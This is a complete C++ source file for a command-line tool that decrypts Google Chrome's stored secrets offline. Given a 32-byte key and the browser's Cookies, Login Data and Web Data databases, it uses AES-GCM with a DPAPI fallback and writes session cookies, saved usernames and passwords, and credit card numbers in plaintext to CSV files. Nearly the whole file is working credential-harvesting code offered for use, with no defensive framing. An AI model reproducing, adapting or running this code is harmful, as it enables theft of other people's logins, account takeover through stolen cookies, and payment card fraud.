// main.cpp
//
// Offline Chrome Decrypter for Cookies, Login Data & Web Data (credit cards)
// Usage example:
//   decrypt.exe --key <64-hex> --cookies <Cookies DB> --logins <Login Data DB> --webdata <Web Data DB>
//
#include <windows.h>
#include <wincrypt.h>      // CryptUnprotectData
#include <bcrypt.h>        // AES-GCM via CNG
#include <sqlite3.h>
#include <fstream>
#include <iostream>
#include <iomanip>
#include <sstream>
#include <string>
#include <vector>
#include <cstring>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

#ifndef STATUS_SUCCESS
  #define STATUS_SUCCESS ((NTSTATUS)0x00000000)
#endif

// AES-GCM “v20” format constants
static constexpr char   V20_PREFIX[]  = "v20";
static constexpr size_t V20_LEN       = 3;
static constexpr ULONG  GCM_IV_LEN    = 12;
static constexpr ULONG  GCM_TAG_LEN   = 16;
static constexpr size_t META_OFFSET   = 32;  // skip 32‐byte metadata in cookies

// ---- hex → bytes ---------------------------------------------------------
static bool hexToBytes(const std::string &hex, std::vector<BYTE> &out) {
    if (hex.size() % 2) return false;
    out.clear(); out.reserve(hex.size()/2);
    for (size_t i = 0; i < hex.size(); i += 2) {
        out.push_back((BYTE)strtoul(hex.substr(i,2).c_str(), nullptr, 16));
    }
    return true;
}

// ---- AES-GCM decrypt via CNG ----------------------------------------------
static bool aesGcmDecrypt(
    BCRYPT_KEY_HANDLE    hKey,
    const BYTE*          iv,    ULONG ivLen,
    const BYTE*          ct,    ULONG ctLen,
    const BYTE*          tag,   ULONG tagLen,
    std::vector<BYTE> &  pt
) {
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = const_cast<PUCHAR>(iv);
    info.cbNonce = ivLen;
    info.pbTag   = const_cast<PUCHAR>(tag);
    info.cbTag   = tagLen;

    pt.resize(ctLen);
    ULONG decrypted = 0;
    NTSTATUS st = BCryptDecrypt(
        hKey,
        const_cast<PUCHAR>(ct), ctLen,
        &info,
        NULL, 0,
        pt.data(), ctLen,
        &decrypted, 0
    );
    if (st != STATUS_SUCCESS) return false;
    pt.resize(decrypted);
    return true;
}

// ---- DPAPI decrypt for non-v20 blobs --------------------------------------
static bool dpapiDecrypt(
    const BYTE*          blob, DWORD blobLen,
    std::vector<BYTE> &  pt
) {
    DATA_BLOB in{ blobLen, const_cast<BYTE*>(blob) }, out;
    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
        return false;
    pt.assign(out.pbData, out.pbData + out.cbData);
    LocalFree(out.pbData);
    return true;
}

// ---- CSV‐quoting helper ---------------------------------------------------
static std::string csvQuote(const std::string &s) {
    if (s.find_first_of(",\"") == std::string::npos) return s;
    std::string q = "\"";
    for (char c : s) {
        q += (c == '"') ? std::string("\"\"") : std::string(1, c);
    }
    q += "\"";
    return q;
}

// ---- Dump Cookies ---------------------------------------------------------
static void dumpCookies(const std::string &dbPath, BCRYPT_KEY_HANDLE hKey) {
    sqlite3 *db = nullptr;
    if (sqlite3_open(dbPath.c_str(), &db) != SQLITE_OK) {
        std::cerr << "[!] open Cookies DB failed: " << sqlite3_errmsg(db) << "\n";
        return;
    }
    sqlite3_stmt *stmt = nullptr;
    sqlite3_prepare_v2(db,
      "SELECT host_key,name,encrypted_value FROM cookies", -1, &stmt, NULL);

    std::ofstream f("cookies_output.csv");
    f << "host_key,name,value\n";

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string host((char*)sqlite3_column_text(stmt,0));
        std::string name((char*)sqlite3_column_text(stmt,1));
        const BYTE *blob = (BYTE*)sqlite3_column_blob(stmt,2);
        int blobLen     = sqlite3_column_bytes(stmt,2);

        std::string val;
        bool done = false;

        // AES-GCM v20?
        if (blobLen > int(V20_LEN + GCM_IV_LEN + GCM_TAG_LEN) &&
            std::memcmp(blob, V20_PREFIX, V20_LEN) == 0)
        {
            const BYTE *iv   = blob + V20_LEN;
            const BYTE *ct   = iv   + GCM_IV_LEN;
            ULONG      ctLen = blobLen - V20_LEN - GCM_IV_LEN - GCM_TAG_LEN;
            const BYTE *tag  = ct   + ctLen;

            std::vector<BYTE> pt;
            if (aesGcmDecrypt(hKey, iv, GCM_IV_LEN, ct, ctLen, tag, GCM_TAG_LEN, pt)
                && pt.size() > META_OFFSET)
            {
                val.assign((char*)pt.data() + META_OFFSET,
                           pt.size() - META_OFFSET);
                done = true;
            }
        }

        // DPAPI fallback
        if (!done) {
            std::vector<BYTE> pt;
            if (dpapiDecrypt(blob, blobLen, pt)) {
                val.assign((char*)pt.data(), pt.size());
                done = true;
            }
        }

        // hex-dump fallback
        if (!done) {
            std::ostringstream oss;
            oss << "0x";
            for (int i = 0; i < blobLen; i++)
                oss << std::hex << std::setw(2) << std::setfill('0')
                    << (int)blob[i];
            val = oss.str();
        }

        f << csvQuote(host) << "," << csvQuote(name) << "," << csvQuote(val) << "\n";
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    std::cout << "[+] Wrote cookies_output.csv\n";
}

// ---- Dump Login Data ------------------------------------------------------
static void dumpLogins(const std::string &dbPath, BCRYPT_KEY_HANDLE hKey) {
    sqlite3 *db = nullptr;
    if (sqlite3_open(dbPath.c_str(), &db) != SQLITE_OK) {
        std::cerr << "[!] open Login DB failed: " << sqlite3_errmsg(db) << "\n";
        return;
    }
    sqlite3_stmt *stmt = nullptr;
    sqlite3_prepare_v2(db,
      "SELECT origin_url,username_value,password_value FROM logins", -1, &stmt, NULL);

    std::ofstream f("logins_output.csv");
    f << "origin_url,username,password\n";

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string url ((char*)sqlite3_column_text(stmt,0));
        std::string user((char*)sqlite3_column_text(stmt,1));
        const BYTE *blob = (BYTE*)sqlite3_column_blob(stmt,2);
        int blobLen     = sqlite3_column_bytes(stmt,2);

        std::string pass;
        bool done = false;

        // AES-GCM v20?
        if (blobLen > int(V20_LEN + GCM_IV_LEN + GCM_TAG_LEN) &&
            std::memcmp(blob, V20_PREFIX, V20_LEN) == 0)
        {
            const BYTE *iv   = blob + V20_LEN;
            const BYTE *ct   = iv   + GCM_IV_LEN;
            ULONG      ctLen = blobLen - V20_LEN - GCM_IV_LEN - GCM_TAG_LEN;
            const BYTE *tag  = ct   + ctLen;

            std::vector<BYTE> pt;
            if (aesGcmDecrypt(hKey, iv, GCM_IV_LEN, ct, ctLen, tag, GCM_TAG_LEN, pt)) {
                pass.assign((char*)pt.data(), pt.size());
                done = true;
            }
        }

        // DPAPI fallback
        if (!done) {
            std::vector<BYTE> pt;
            if (dpapiDecrypt(blob, blobLen, pt)) {
                pass.assign((char*)pt.data(), pt.size());
                done = true;
            }
        }

        // hex-dump fallback
        if (!done) {
            std::ostringstream oss;
            oss << "0x";
            for (int i = 0; i < blobLen; i++)
                oss << std::hex << std::setw(2) << std::setfill('0')
                    << (int)blob[i];
            pass = oss.str();
        }

        f << csvQuote(url) << "," 
          << csvQuote(user) << "," 
          << csvQuote(pass) << "\n";
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    std::cout << "[+] Wrote logins_output.csv\n";
}

// ---- Dump Web Data (credit_cards) ----------------------------------------
static void dumpWebData(const std::string &dbPath, BCRYPT_KEY_HANDLE hKey) {
    sqlite3 *db = nullptr;
    if (sqlite3_open(dbPath.c_str(), &db) != SQLITE_OK) {
        std::cerr << "[!] open Web Data DB failed: " << sqlite3_errmsg(db) << "\n";
        return;
    }
    sqlite3_stmt *stmt = nullptr;
    sqlite3_prepare_v2(db,
      "SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted "
      "FROM credit_cards", -1, &stmt, NULL);

    std::ofstream f("webdata_output.csv");
    f << "name_on_card,exp_month,exp_year,card_number\n";

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string name((char*)sqlite3_column_text(stmt,0));
        int month = sqlite3_column_int(stmt,1);
        int year  = sqlite3_column_int(stmt,2);
        const BYTE *blob = (BYTE*)sqlite3_column_blob(stmt,3);
        int blobLen     = sqlite3_column_bytes(stmt,3);

        std::string cc;
        bool done = false;
        // AES-GCM v20?
        if (blobLen > int(V20_LEN + GCM_IV_LEN + GCM_TAG_LEN) &&
            std::memcmp(blob, V20_PREFIX, V20_LEN) == 0)
        {
            const BYTE *iv   = blob + V20_LEN;
            const BYTE *ct   = iv   + GCM_IV_LEN;
            ULONG      ctLen = blobLen - V20_LEN - GCM_IV_LEN - GCM_TAG_LEN;
            const BYTE *tag  = ct   + ctLen;

            std::vector<BYTE> pt;
            if (aesGcmDecrypt(hKey, iv, GCM_IV_LEN, ct, ctLen, tag, GCM_TAG_LEN, pt)) {
                cc.assign((char*)pt.data(), pt.size());
                done = true;
            }
        }
        // DPAPI fallback
        if (!done) {
            std::vector<BYTE> pt;
            if (dpapiDecrypt(blob, blobLen, pt)) {
                cc.assign((char*)pt.data(), pt.size());
                done = true;
            }
        }
        // hex fallback
        if (!done) {
            std::ostringstream oss;
            oss << "0x";
            for (int i = 0; i < blobLen; i++)
                oss << std::hex << std::setw(2) << std::setfill('0')
                    << (int)blob[i];
            cc = oss.str();
        }

        f << csvQuote(name) << ","
          << month << "," << year << ","
          << csvQuote(cc) << "\n";
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    std::cout << "[+] Wrote webdata_output.csv\n";
}

// ---- Usage ---------------------------------------------------------------
static void printUsage() {
    std::cerr << "Usage:\n"
              << "  decrypt.exe --key <64-hex> \\\n"
              << "               [--cookies <path>] \\\n"
              << "               [--logins  <path>] \\\n"
              << "               [--webdata <path>]\n";
}

int main(int argc, char **argv) {
    std::string keyHex, cookieDB, loginDB, webDataDB;
    for (int i = 1; i < argc; i++) {
        if (!std::strcmp(argv[i], "--key")    && i+1<argc) keyHex    = argv[++i];
        else if (!std::strcmp(argv[i], "--cookies") && i+1<argc) cookieDB  = argv[++i];
        else if (!std::strcmp(argv[i], "--logins")  && i+1<argc) loginDB   = argv[++i];
        else if (!std::strcmp(argv[i], "--webdata") && i+1<argc) webDataDB = argv[++i];
    }
    if (keyHex.empty() || (cookieDB.empty() && loginDB.empty() && webDataDB.empty())) {
        printUsage();
        return 1;
    }

    // Decode state key
    std::vector<BYTE> stateKey;
    if (!hexToBytes(keyHex, stateKey) || stateKey.size()!=32) {
        std::cerr<<"[!] Invalid key format\n";
        return 1;
    }

    // Init AES-GCM
    BCRYPT_ALG_HANDLE hAlg = NULL;    
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                     (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                     sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCRYPT_KEY_HANDLE hKey = NULL;
    BCryptGenerateSymmetricKey(
       hAlg, &hKey, NULL, 0,
       stateKey.data(), (ULONG)stateKey.size(), 0
    );

    // Dump whichever DBs user asked for
    if (!cookieDB.empty())  dumpCookies(cookieDB,  hKey);
    if (!loginDB.empty())   dumpLogins (loginDB,   hKey);
    if (!webDataDB.empty()) dumpWebData(webDataDB, hKey);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg,0);
    return 0;
}
